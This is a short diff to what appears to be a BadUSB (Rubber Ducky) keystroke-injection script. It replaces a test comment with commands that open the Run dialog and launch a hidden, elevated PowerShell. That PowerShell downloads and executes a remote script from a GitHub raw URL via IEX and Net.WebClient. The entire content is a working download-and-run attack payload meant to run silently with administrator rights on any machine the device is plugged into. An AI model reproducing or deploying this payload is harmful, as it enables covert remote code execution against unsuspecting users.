@@ -1,1 +1,5 @@
-REM TEST
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList '-NoProfile -Command \"IEX((New-Object Net.WebClient).DownloadString(\"\"https://raw.githubusercontent.com/Vaidx0/NO-KEYBOARD/refs/heads/main/NO-KEYBOARD.txt\"\"))\"'"
+ENTER
